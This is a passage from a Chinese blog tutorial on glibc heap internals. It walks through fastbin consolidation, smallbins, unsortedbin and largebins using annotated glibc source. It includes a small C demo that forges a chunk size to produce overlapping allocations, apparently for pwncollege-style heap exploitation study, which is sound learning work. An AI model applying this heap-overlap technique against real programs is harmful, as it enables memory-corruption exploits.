class="line"><span class="comment">       Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">else</span>		<span class="comment">//到此说明fastbins已经全杀了,如果还不能满足分配需求,说明ptmalloc已经捉襟见肘了,需要系统调用brk,给堆区扩容了</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">        <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
<p>3.在<code>free</code>时如果释放的堆块非常大,大于<code>65536</code>个字节,也就是<code>64KB</code>,并且此时<code>fastbins</code>中有东西,也会发生,目的是把<code>fastbins</code>中的黑户杀了,能合并到这个大块儿的就合并,然后调用<code>munmap</code>缩减堆区</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  if ((unsigned long)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">    if (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">	malloc_consolidate(av);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>4.<code>malloc_trim</code>被调用时,子函数<code>mtrim</code>会进行<code>malloc_consolidate</code>,这个<code>malloc_trim</code>作用是削减堆区空间返还给操作系统</p>
<blockquote>
<p>然而在glibc中并没有找到该函数的调用者,可能是提供给开发者手动管理内存用的</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">static int</span><br><span class="line">mtrim (mstate av, size_t pad)</span><br><span class="line">&#123;</span><br><span class="line">  /* Ensure all blocks are consolidated.  */</span><br><span class="line">  malloc_consolidate (av);</span><br></pre></td></tr></table></figure>
<p><strong>malloc_consolidate的效果</strong></p>
<p>零帧起手,直接宣判<code>fastbins</code>中的堆块死刑</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
<p>意思是本函数执行完毕之后,<code>fastbins</code>中将无人生还</p>
<p>具体干了啥呢?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">从小到大遍历fastbins中的10个桶子,对于每个桶子:</span><br><span class="line">	如果桶子为空则continue</span><br><span class="line">	如果桶子不空:</span><br><span class="line">		遍历该桶子上挂的每个堆块,对于每个堆块:</span><br><span class="line">			· 如果物理上相邻的前块空闲 则:</span><br><span class="line">				向前合并,并将前块从其所在bin中unlink拆下来</span><br><span class="line"></span><br><span class="line">			· 如果物理上相邻的后块不是topchunk 则:</span><br><span class="line">				如果该后块空闲 则:</span><br><span class="line">					把后块从其所在bin中unlink拆下来,</span><br><span class="line">					当前块向后合并</span><br><span class="line">				如果后块正在使用 则:</span><br><span class="line">					后块的P标志归零</span><br><span class="line">				挂到unsortedbin上</span><br><span class="line">				</span><br><span class="line">				</span><br><span class="line">			· 如果物理上相邻的后块是topchunk 则:</span><br><span class="line">				合并到topchunk</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">maxfb = &amp;fastbin(av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">fb = &amp;fastbin(av, <span class="number">0</span>);   <span class="comment">//迭代遍历fastbins中的每个桶子,从第0个桶子开始,到最后一个</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;       <span class="comment">//从小到大遍历fastbins中的10个桶子</span></span><br><span class="line">    p = atomic_exchange_acq(fb, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="number">0</span>)     <span class="comment">//桶子非空</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (__glibc_unlikely(misaligned_chunk(p)))</span><br><span class="line">                    malloc_printerr(<span class="string">&quot;malloc_consolidate(): &quot;</span></span><br><span class="line">                                    <span class="string">&quot;unaligned fastbin chunk detected&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="type">unsigned</span> <span class="type">int</span> idx = fastbin_index(chunksize(p));</span><br><span class="line">                <span class="keyword">if</span> ((&amp;fastbin(av, idx)) != fb)</span><br><span class="line">                    malloc_printerr(<span class="string">&quot;malloc_consolidate(): invalid chunk size&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            check_inuse_chunk(av, p);</span><br><span class="line">            nextp = REVEAL_PTR(p-&gt;fd);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* Slightly streamlined version of consolidation code in free() */</span></span><br><span class="line">            size = chunksize(p);</span><br><span class="line">            nextchunk = chunk_at_offset(p, size);</span><br><span class="line">            nextsize = chunksize(nextchunk);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!prev_inuse(p)) <span class="comment">//尝试向前合并</span></span><br><span class="line">            &#123;</span><br><span class="line">                prevsize = prev_size(p);</span><br><span class="line">                size += prevsize;</span><br><span class="line">                p = chunk_at_offset(p, -((<span class="type">long</span>)prevsize));</span><br><span class="line">                <span class="keyword">if</span> (__glibc_unlikely(chunksize(p) != prevsize))</span><br><span class="line">                    malloc_printerr(<span class="string">&quot;corrupted size vs. prev_size in fastbins&quot;</span>);</span><br><span class="line">                unlink_chunk(av, p);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (nextchunk != av-&gt;top)       <span class="comment">//尝试向后合并</span></span><br><span class="line">            &#123;</span><br><span class="line">                nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!nextinuse)</span><br><span class="line">                &#123;</span><br><span class="line">                    size += nextsize;</span><br><span class="line">                    unlink_chunk(av, nextchunk);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">                first_unsorted = unsorted_bin-&gt;fd;  <span class="comment">//挂到unsortedbin上</span></span><br><span class="line">                unsorted_bin-&gt;fd = p;</span><br><span class="line">                first_unsorted-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">                &#123;</span><br><span class="line">                    p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                    p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                set_head(p, size | PREV_INUSE);</span><br><span class="line">                p-&gt;bk = unsorted_bin;</span><br><span class="line">                p-&gt;fd = first_unsorted;</span><br><span class="line">                set_foot(p, size);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>                        <span class="comment">//合并到topchunk</span></span><br><span class="line">            &#123;</span><br><span class="line">                size += nextsize;</span><br><span class="line">                set_head(p, size | PREV_INUSE);</span><br><span class="line">                av-&gt;top = p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">while</span> ((p = nextp) != <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="小斌smallbins">小斌Smallbins</h3>
<p><code>bin_at(M,2~63)</code>这个范围是小斌</p>
<h4 id="datastructure-1">datastructure</h4>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241026213732598.png"
alt="image-20241026213732598" />
<figcaption aria-hidden="true">image-20241026213732598</figcaption>
</figure>
<p>带附加头节点的双向循环链表</p>
<p>桶子头到堆块的指针是裸露的</p>
<p>堆块之间的指针是加了密的,真是加了私权</p>
<h4 id="algorithm-2">algorithm</h4>
<p>小斌可能去这几个地方进货:</p>
<p>1.使用<code>malloc</code>时,如果轮到乱斌出力,如果乱斌发现自己管理的堆块实际上是小斌的范围,乱斌会扔给小斌</p>
<h5 id="malloc-1">malloc</h5>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241026174304710.png"
alt="malloc beyond tcache" />
<figcaption aria-hidden="true">malloc beyond tcache</figcaption>
</figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range(nb))</span><br><span class="line">&#123;</span><br><span class="line">    idx = smallbin_index(nb);</span><br><span class="line">    bin = bin_at(av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((victim = last(bin)) != bin)					<span class="comment">//至少有一块</span></span><br><span class="line">    &#123;</span><br><span class="line">        bck = victim-&gt;bk;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim))        <span class="comment">//类fastbin检查DF的唐氏方法</span></span><br><span class="line">            malloc_printerr(<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">        set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">        bin-&gt;bk = bck;</span><br><span class="line">        bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">            set_non_main_arena(victim);</span><br><span class="line">        check_malloced_chunk(av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE              <span class="comment">//类似于fastbin使用tcache缓冲的方法</span></span></span><br><span class="line">        <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">           stash them in the tcache.  */</span></span><br><span class="line">        <span class="type">size_t</span> tc_idx = csize2tidx(nb);</span><br><span class="line">        <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">        &#123;</span><br><span class="line">            mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">            <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = last(bin)) != bin)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    bck = tc_victim-&gt;bk;</span><br><span class="line">                    set_inuse_bit_at_offset(tc_victim, nb);</span><br><span class="line">                    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                        set_non_main_arena(tc_victim);</span><br><span class="line">                    bin-&gt;bk = bck;</span><br><span class="line">                    bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">                    tcache_put(tc_victim, tc_idx);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">        alloc_perturb(p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果不考虑tcache,那么相应一次malloc请求之后,smallbin长这样:</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241026213926914.png"
alt="image-20241026213926914" />
<figcaption aria-hidden="true">image-20241026213926914</figcaption>
</figure>
<h3 id="乱斌unsortedbin">乱斌Unsortedbin</h3>
<h4 id="algorithm-3">algorithm</h4>
<p>乱斌是斌家的进口部长,大斌和小斌的货,都是乱斌给的</p>
<p>乱斌可能从这几个地方进货:</p>
<p>1.当<code>fastbins</code>中触发了<code>malloc_consolidate</code>之后,如果堆块没有被合并到<code>topchunk</code>
,那么其归宿就是<code>unsortedbin</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">...</span><br><span class="line">  first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">  unsorted_bin-&gt;fd = p;</span><br><span class="line">  first_unsorted-&gt;bk = p;</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure>
<p>2.在<code>free</code>时,如果堆块不是<code>mmap</code>的,并且<code>tcache</code>,<code>fastbins</code>都没能留住堆块,并且堆块没有被合并到<code>topchunk</code>,那么其归宿就是<code>unsortedbin</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p))         <span class="comment">//尝试向前合并</span></span><br><span class="line">    &#123;</span><br><span class="line">        prevsize = prev_size(p);</span><br><span class="line">        size += prevsize;</span><br><span class="line">        p = chunk_at_offset(p, -((<span class="type">long</span>)prevsize));</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(chunksize(p) != prevsize))</span><br><span class="line">            malloc_printerr(<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">        unlink_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top)       <span class="comment">//尝试向后合并</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">        nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* consolidate forward */</span></span><br><span class="line">        <span class="keyword">if</span> (!nextinuse)</span><br><span class="line">        &#123;</span><br><span class="line">            unlink_chunk(av, nextchunk);        <span class="comment">//向后合并</span></span><br><span class="line">            size += nextsize;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">      not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">      been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">        bck = unsorted_chunks(av);      <span class="comment">//挂到unsortedbin上</span></span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck))</span><br><span class="line">            malloc_printerr(<span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>);</span><br><span class="line">        p-&gt;fd = fwd;</span><br><span class="line">        p-&gt;bk = bck;</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">        &#123;</span><br><span class="line">            p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        bck-&gt;fd = p;</span><br><span class="line">        fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">        set_head(p, size | PREV_INUSE);</span><br><span class="line">        set_foot(p, size);</span><br><span class="line"></span><br><span class="line">        check_free_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>3.在malloc时,如果从<code>unsorted</code>中切割了一个大块满足一个小块的分配请求,那么剩余块会被重新挂到<code>unsortedbin</code>中</p>
<h5 id="free-1">free</h5>
<p>如果一个堆块被<code>free</code>之后,既没有被<code>tcache</code>,<code>fastbins</code>留住,也不是<code>mmap</code>映射块,那么此时该堆块可能有两种归宿:</p>
<p>1.物理上与<code>topchunk</code>相邻,合并到<code>topchunk</code></p>
<p>2.不与<code>topchunk</code>相邻,挂到<code>unsortedbin</code>上</p>
<p>[不太可能发生的]如果该堆块过大,超过<code>fastbins</code>合并阈值(64K),会触发堆内存缩减</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p))			<span class="comment">//非mmap映射区</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) <span class="comment">// 尝试向前合并</span></span><br><span class="line">    &#123;</span><br><span class="line">		...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top) <span class="comment">// 尝试向后合并</span></span><br><span class="line">    &#123;</span><br><span class="line">		...</span><br><span class="line">        bck = unsorted_chunks(av); <span class="comment">// 挂到unsortedbin上</span></span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">		...</span><br><span class="line">        p-&gt;fd = fwd;</span><br><span class="line">        p-&gt;bk = bck;</span><br><span class="line">		...</span><br><span class="line">        bck-&gt;fd = p;</span><br><span class="line">        fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">        set_head(p, size | PREV_INUSE);</span><br><span class="line">        set_foot(p, size);</span><br><span class="line"></span><br><span class="line">        check_free_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="comment">// 合并到topchunk</span></span><br><span class="line">    &#123;</span><br><span class="line">        size += nextsize;</span><br><span class="line">        set_head(p, size | PREV_INUSE);</span><br><span class="line">        av-&gt;top = p;</span><br><span class="line">        check_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="malloc-2">malloc</h5>
<p>当<code>tcache</code>,<code>fastbins</code>,<code>smallbins</code>都没有满足一次分配请求,可能是请求大小太大,或者哥仨穷的叮当响,反正就是没满足</p>
<p>为了利用局部性原则,<code>unsortedbin</code>中有一个指针<code>last_remainder</code>,也就是最后一次切割<code>unsortedbin</code>中堆块后剩下的部分</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">外圈循环</span><br><span class="line">	内圈循环遍历unsortedbin,对于每个unsorted中的堆块:</span><br><span class="line">		如果是unsorted中的唯一堆块,并且该块是last_remainder并且这块足够相应请求 则:</span><br><span class="line">			继续切它,*返回*需要的,留下多余的</span><br><span class="line">		否则可能有如下情况:<span class="number">1.</span>这块不是unsorted中的唯一块 <span class="number">2.</span>不是last_remainder <span class="number">3.</span>不够大   此时应:</span><br><span class="line">			把它从unsortedbin上拆下来,然后:</span><br><span class="line">			如果大小正好满足请求</span><br><span class="line">				如果tcache未满,则放到tcache中</span><br><span class="line">				如果tcache满了,或者未启用tcache,则直接*返回*</span><br><span class="line">			否则如果大小在smallbins范围内,则放到smallbins中</span><br><span class="line">			否则大小在largebins范围内,则放到largebins中</span><br><span class="line">			如果被放到了tcache中,此时从tcache中拿一个*返回*</span><br><span class="line">    内圈循环结束</span><br><span class="line">                </span><br><span class="line">	如果申请大小在largebins范围,则尝试使用largebin分配</span><br><span class="line">	如果刚才的largebin没有满足请求,则遍历更大号的largebin中找</span><br><span class="line">	如果还没满足,使用topchunk分配</span><br><span class="line">	如果还没满足,使用sysmalloc分配</span><br><span class="line">                </span><br><span class="line">外圈循环结束</span><br></pre></td></tr></table></figure>
<h4 id="exploit">exploit</h4>
<h5 id="overlap">overlap</h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> *p1;</span><br><span class="line">    <span class="type">size_t</span> *p2;</span><br><span class="line">    p1 = <span class="built_in">malloc</span>(<span class="number">0x400</span>); <span class="comment">// usable(0x400) + header(0x10)</span></span><br><span class="line">    p2 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);  <span class="comment">// usable(0x40) + header(0x10)</span></span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *p1_size = (<span class="type">char</span>*)p1 - <span class="number">0x8</span>;      </span><br><span class="line">    *p1_size = <span class="number">0x461</span>;       <span class="comment">//suppose off by one ... </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;p1: %p\n&quot;</span>, p1);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p1);			<span class="comment">//in unsortedbin</span></span><br><span class="line">    p1 = <span class="built_in">malloc</span>(<span class="number">0x450</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;p1: %p\n&quot;</span>, p1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# gcc overlap.c -o overlap -g -w</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# ./overlap</span><br><span class="line">p1: 0x5600128e52a0</span><br><span class="line">p1: 0x5600128e52a0</span><br></pre></td></tr></table></figure>
<h3 id="大斌largebins">大斌Largebins</h3>
<p><code>bin_at(M,64~126) =&gt; large bins</code>这个范围是largetbin,一共有63个bin</p>
<p>bin内堆块大小相等</p>
<p>bin之间分了6组,组内各个bin堆块大小成等差数列</p>
<table>
<thead>
<tr>
<th>组</th>
<th>个数</th>
<th>公差</th>
</tr>
</thead>
<tbody>
<tr>
<td>bin_at(M,64~95)</td>
<td>32</td>
<td>64B</td>
</tr>
<tr>
<td>bin_at(M,96~111)</td>
<td>16</td>
<td>512B</td>
</tr>
<tr>
<td>bin_at(M,112~119)</td>
<td>8</td>
<td>4096B</td>
</tr>
<tr>
<td>bin_at(M,120~123)</td>
<td>4</td>
<td>32768B</td>
</tr>
<tr>
<td>bin_at(M,124~125)</td>
<td>2</td>
<td>…</td>
</tr>
<tr>
<td>bin_at(M,126)</td>
<td>1</td>
<td>…</td>
</tr>
</tbody>
</table>
<h4 id="datastructure-2">datastructure</h4>
<p>假设<code>largebins</code>的<code>bin_at(M,63)</code>目前的状态如下:</p>
